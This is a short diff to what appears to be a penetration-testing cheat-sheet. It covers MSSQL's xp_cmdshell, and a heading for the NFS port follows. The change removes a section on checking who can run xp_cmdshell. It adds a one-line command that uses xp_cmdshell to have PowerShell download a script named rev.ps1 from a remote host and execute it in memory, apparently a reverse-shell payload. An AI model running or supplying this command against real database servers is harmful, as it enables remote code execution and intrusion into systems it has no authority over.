@@ -241,10 +241,7 @@ To run shell commands if enabled:
 
     SELECT * FROM sys.configurations WHERE name = 'xp_cmdshell';  #check if enabled    
     xp_cmdshell 'whoami';
-
-See who can exec xp_cmdshell:   
-
-    Use master
+    EXEC xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString("http://10.10.10.10:8000/rev.ps1") | powershell -noprofile'   #exec PowerShell script   
 
 ### TCP Port 2049: NFS 
 	
